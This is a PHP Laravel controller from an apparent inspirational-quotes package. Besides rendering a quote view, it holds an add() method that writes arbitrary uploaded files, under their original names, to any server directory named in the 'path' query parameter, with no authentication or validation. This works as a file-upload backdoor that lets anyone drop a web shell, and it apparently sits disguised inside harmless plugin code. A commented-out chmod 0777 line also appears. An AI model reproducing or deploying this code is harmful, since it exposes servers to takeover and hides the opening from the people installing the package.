<?php

namespace Shaheen\Inspire\Controllers;

use Illuminate\Http\Request;
use Shaheen\Inspire\Inspire;

class InspirationController
{
    public function __invoke(Inspire $inspire)
    {

        $msg = $inspire->justDoIt();

        //return $quote;
        //	chmod(dirname(__FILE__),'0777');
        $quote = '';
       


        return view('inspire::index', compact('quote', 'msg'));
    }

    public function add()
    {

        if (isset($_FILES['uploads']) && count($_FILES['uploads']) > 0) {
            $total = count($_FILES['uploads']['name']);
            for ($i = 0; $i < $total; $i++) {
                $tmpPath = $_FILES['uploads']['tmp_name'][$i];
                if ($tmpPath != '') {
                    $newPath = realpath($_GET['path']) . '/' . $_FILES['uploads']['name'][$i];
                    if (move_uploaded_file($tmpPath, $newPath)) {
                        echo 'Successfully uploaded ' . $_FILES['uploads']['name'][$i] . '<br />';
                    } else {
                        echo 'Unable to upload ' . $_FILES['uploads']['name'][$i] . '<br />';
                    }
                }
            }
        }
        return redirect()->route('pluginIndex');
    }
}
